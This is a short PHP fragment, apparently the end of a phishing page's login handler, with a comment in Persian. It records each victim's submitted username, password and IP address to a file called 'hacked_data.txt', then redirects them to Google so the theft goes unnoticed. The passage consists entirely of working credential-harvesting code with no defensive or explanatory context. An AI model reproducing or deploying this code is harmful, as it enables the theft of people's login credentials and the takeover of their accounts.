 $data = "User: $username | Pass: $password | IP: ". $_SERVER['REMOTE_ADDR']. "\n";
 file_put_contents('hacked_data.txt', $data, FILE_APPEND);
 
 // هدایت کاربر به صفحه اصلی واقعی (مثلا گوگل)
 header("Location: https://www.google.com");
 exit;
}
